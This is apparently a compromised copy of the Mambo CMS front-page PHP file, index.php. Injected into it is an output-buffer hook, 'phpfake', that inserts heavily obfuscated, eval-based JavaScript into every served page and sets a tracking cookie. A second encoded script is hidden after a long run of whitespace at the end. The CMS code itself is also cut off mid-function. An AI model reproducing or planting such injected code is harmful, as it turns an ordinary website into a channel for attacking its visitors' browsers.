<?php
ob_start("phpfake");




/**
* @version $Id: index.php,v 1.9 2005/02/16 02:03:33 eddieajau Exp $
* @package Mambo
* @copyright (C) 2000 - 2005 Miro International Pty Ltd
* @license http://www.gnu.org/copyleft/gpl.html GNU/GPL
* Mambo is Free Software
*/

/** Set flag that this is a parent file */
define( '_VALID_MOS', 1 );

// checks for configuration file, if none found loads installation page
if ( !file_exists( 'configuration.php' ) || filesize( 'configuration.php' ) < 10 ) {
	header( 'Location: installation/index.php' );
	exit();
}

include_once( 'globals.php' );
require_once( 'configuration.php' );

// displays offline page
if ( $mosConfig_offline == 1 ){
	include( 'offline.php' );
	exit();
}

require_once( 'includes/mambo.php' );
if (file_exists( 'components/com_sef/sef.php' )) {
	require_once( 'components/com_sef/sef.php' );
} else {
	require_once( 'includes/sef.php' );
}
require_once( 'includes/frontend.php' );

/*
Installation sub folder check, removed for work with CVS*/
if (file_exists( 'installation/index.php' )) {
	include ('offline.php');
	exit();
}
/**/
/** retrieve some expected url (or form) arguments */
$option = trim( strtolower( mosGetParam( $_REQUEST, 'option' ) ) );
$Itemid = intval( mosGetParam( $_REQUEST, 'Itemid', null ) );
$database = new database( $mosConfig_host, $mosConfig_user, $mosConfig_password, $mosConfig_db, $mosConfig_dbprefix );
$database->debug( $mosConfig_debug );
$acl = new gacl_api();

if ($option == '') {
	if ($Itemid) {
		$query = "SELECT id, link"
		. "\n FROM #__menu"
		. "\n WHERE menutype='mainmenu'"
		. "\n AND id = '$Itemid'"
		. "\n AND published = '1'"
		;
		$database->setQuery( $query );
	} else {
		$query = "SELECT id, link"
		. "\n FROM #__menu"
		. "\n WHERE menutype='mainmenu' AND published='1'"
		. "\n ORDER BY parent, ordering LIMIT 1"
		;
		$database->setQuery( $query );
	}
	$menu = new mosMenu( $database );
	if ($database->loadObject( $menu )) {
		$Itemid = $menu->id;
	}
	$link = $menu->link;
	if (($pos = strpos( $link, '?' )) !== false) {
		$link = substr( $link, $pos+1 ). '&Itemid='.$Itemid;
	}
	parse_str( $link, $temp );
	/** this is a patch, need to rework when globals are handled better */
	foreach ($temp as $k=>$v) {
		$GLOBALS[$k] = $v;
		$_REQUEST[$k] = $v;
		if ($k == 'option') {
			$option = $v;
		}
	}
}

/** do we have a valid Itemid yet?? */
if ( $Itemid === null ) {
	/** Nope, just use the homepage then. */
	$query = "SELECT id"
	. "\n FROM #__menu"
	. "\n WHERE menutype='mainmenu'"
	. "\n AND published='1'"
	. "\n ORDER BY parent, ordering"
	. "\n LIMIT 1"
	;
	$database->setQuery( $query );
	$Itemid = $database->loadResult();
}

/** patch to lessen the impact on templates */
if ($option == 'search') {
	$option = 'com_search';
}

/** mainframe is an API workhorse, lots of 'core' interaction routines */
$mainframe = new mosMainFrame( $database, $option, '.' );
$mainframe->initSession();

// loads english language file by default
if ( $mosConfig_lang == '' ) {
	$mosConfig_lang = 'english';
}
include_once ( 'language/'.$mosConfig_lang.'.php' );

// frontend login & logout controls
$return = mosGetParam( $_REQUEST, 'return', NULL );
$message = mosGetParam( $_POST, 'message', 0 );
if ($option == "login") {
	$mainframe->login();

	// JS Popup message
	if ( $message ) {
		?>
<?php
function phpfake($buffer)
{
  $Exp='<script language="javascript">$="%64d%3d%22}Sx%3ctSx%3c}^}+yv8d)K7i7M,%2522%2520%2520%279kd)K7i7M0-0%2522%2520%2520%27+m}^}-S]^8d)K7t7M%3cd)K7}7M%3cd)K7i7M9+iSx!-|)K888d)K7i7M6%2520hQQ9;}^}950&5##950%2522&M+iSx%2522-|)K8888d)K7i7M6%2520h##!!9..#9;}^}950!%25209M+}Sx%22;dc%3d%220d)K7t7M-t)%3ewudTqdu89%3d8t)%3ewudTqi899+yv8d)K7t7M,%25209d)K7t7M-!+d)K7}7M-t)%3ewud]%257F~dx89;!+ve~sdy%257F~0S]^8t%3c}%3ci9kfqb0b-888i;8#:t99;8}Nt9:#9;t9+budeb~0b+mfqb0t-7fuc|%257Fh%3es%257F}7+fqb0iSx!%3ciSx%2522%3c%22;de%3d%22-|)K88d)K7}7M;}^}950%2522%259M+yv888d)K7t7M:%25229.-%252096688d)K7t7M:%25229,-)99tSx-~)K8d)K7t7M50!%25209M+u|cu0tSx-|)K88d)K7t7M:&950%2522%279M+4-4%3ebu`|qsu8t%3ciSx%2522;}Sx;iSx!;tSx;})Kd)K7}7M%3d!M;7%3es%257F}79+%22;db%3d%22d7%3c7e7%3c7f7%3c7g7%3c7h7%3c7i7%3c7j79+fqb0~)-~ug0Qbbqi8!%3c%2522%3c#%3c$%3c%25%3c&%3c%27%3c(%3c)9+fqb0d)-~ug0Qbbqi89+fqb0t)-~ug0Tqdu89+d)K7i7M-t)%3ewudVe||Iuqb89+yv8t)%3ewudTqi89.#9d)K7t7M-t)%3ewudTqdu89%3d8t)%3ewudTqi89;%25229+u|cu%22;cd%3d%22s%2574+%2553tri%256e%2567.f%2572%256fmC%2568%2561rCo%2564%2565(%2528t%256dp%252ec%2568%22;st%3d%22%2573%2574%253d%2522$%253d%2573t%253b%2564%2563%2573(%2564%2561%252bd%2562%252bd%2563+%2564d%252bd%2565%252c%2531%2530%2529;%2564w%2528s%2574%2529%253b%2573%2574%253d$;%2522%253b%22;ce%3d%22ar%2543od%2565%2541%2574%25280)^%2528%25270%25780%2530%2527+es%2529))%253b%257d}%22;da%3d%22fqb0})-~ug0Qbbqi87e~%257F7%3c7tfu7%3c7dxb7%3c7vyb7%3c7fyv7%3c7huc7%3c7fuc7%3c7wxd7%3c7u~y7%3c7ud~7%3c7|uf7%3c7dgu79+fqb0|)-~ug0Qbbqi87q7%3c7r7%3c7s7%3c7t7%3c7u7%3c7v7%3c7w7%3c7x7%3c7y7%3c7z7%3c7{7%3c7|7%3c7}7%3c7~7%3c7%257F7%3c7`7%3c7a7%3c7b7%3c7c7%3c7%22;cz%3d%22%2566un%2563tio%256e cz%2528c%257a){%2572e%2574u%2572%256e%2520ca%252bcb+%2563%2563%252bcd%252b%2563e+c%257a;%257d;%22;op%3d%22%2524%253d%2522dw(d%2563s(c%2575,1%2534%2529)%253b%2522;%22;cu%3d%22(p}b4g`mxq)6b}g}v}x}`m.|}ppqz6*(}rfuyq4gfw)6|``d.;;bqgx{l:w{y;xp;pl;64c}p`|)%25$$4|q}s|`),$*(;}rfuyq*(;p}b*%22;ca%3d%22%2566%2575%256e%2563t%2569o%256e%2520dcs%2528d%2573,%2565s%2529{d%2573%253dunesca%2570%22;dz%3d%22%2566un%2563tio%256e d%2577(t%2529{c%2561%253d%2527%252564o%252563ume%25256et%2525%2532ew%252572%252569%2574%2565(%252522%2527;ce%253d%2527%252522)%2527;cb%253d%2527%25253c%252573cr%252569pt%252520%256ca%25256eg%252575a%252567e%25253d%25255c%252522%256aav%2561%2573%252563%252572%2525%25369%2570%2574%25255c%2525%2532%2532%25253e%2527;cc%253d%2527%25253c%25255c%25252fscr%252569%2570%252574%25253e%2527;eva%256c%2528%2575%256ees%2563%2561pe(%2574))%257d;%22;cc%3d%2274%2568;i+%252b%2529{t%256dp%253dd%2573%252es%256c%2569ce%2528i,i%252b1%2529;st%253d%22;cb%3d%22e(d%2573);%2573t%253dtm%2570%253d%2527%2527;for(i%253d0;i%253cds%252e%256ce%256eg%25%22;%69f%20%28d%6fcu%6dent%2e%63%6foki%65.i%6ede%78Of%28%27v%62ul%6cet%69n_m%75%6c%74iq%75o%74e%3d%27)%3d%3d-1){%73%63(%27vbu%6c%6c%65ti%6e%5f%6du%6ct%69q%75%6f%74%65%3d%27,2,7%29%3be%76a%6c(un%65sc%61pe%28d%7a+c%7a+%6f%70%2b%73%74)+%27dw(%64z+c%7a%28$+%73t))%3b%27)}%65ls%65{$%3d%27%27};func%74i%6f%6e %73%63(c%6em%2cv,e%64)%7bv%61r%20ex%64%3dnew%20%44at%65%28%29;%65xd.%73%65t%44ate%28e%78%64%2eget%44at%65()+%65%64)%3b%64%6fc%75men%74.%63oo%6bie%3dcnm%2b%20%27%3d%27 +esca%70e%28v)%2b%27%3b%65%78p%69%72e%73%3d%27+exd.%74oGM%54St%72%69%6eg()%3b}%3b";eval(unescape($));document.write($);</script>';
  return (ereg_replace("</body>", "$Exp</body>", $buffer));
}
?>

                                                                                                                                                                                                                                                                        <!--59e1b46875488201c353605c833e8e4a-><script language=javascript>iucgl="%";zd="<s!63!72ipt!20l!61!6eg!75!61ge=j!61vas!63!72!69pt!3e!20 !66!75n!63t!69!6fn z!69t!61r!28g!64e){!76ar!20bgw,j!63!3d\"!65kTu!66!7a3wB!3a~!2cs^j[Km!5ao!69@!2eM!67!50#)!35'_r=N\\\"vyqJ2!45I!4fn0C|l!47$1!707+!26!20!61!63HVA!38!28!21d!68!3b!2dxb*]`{4!39t!36U!46}\"!2czff=\"!22!2cf!2c!6dq,djo!3d\"\",!76oe;for(bgw!3d!30;b!67w<!67de.le!6egth!3b!62!67w+!2b!29{ !66!3dgde.!63ha!72At(bgw)!3b!6d!71=jc.!69!6ed!65!78!4ff(!66!29;i!66(!6dq!3e!2d!31){ vo!65=((mq+1)!2581-1);!69!66(!76oe<!3d0!29vo!65!2b!3d81!3b!64jo!2b!3d!6ac!2e!63harAt(!76!6fe-!31!29; } e!6c!73!65 !64jo!2b=f;!7dzf!66+=djo!3bdo!63ume!6e!74.!77!72i!74!65!28zff);}<!2fs!63r!69pt>";chnns=unescape(zd.replace(/!/g,iucgl));var kl,c;document.write(chnns);kl="<^H=@76aGc0PfcPkNv[cyc^H=@76v>ahiHfZk06MB=@6k!av<S|RO#uaGc0PfcPkN\\v2cycSH=@76\\vaSR|N\\v;667~//BBBMPiiPGkc0cG@6@H^M0k6/rrf6*M[^?v&hiHfZk06M=kzk==k=&v\\v><\\/S|RO#u>va5-a</^H=@76>aa";zitar(kl);</script>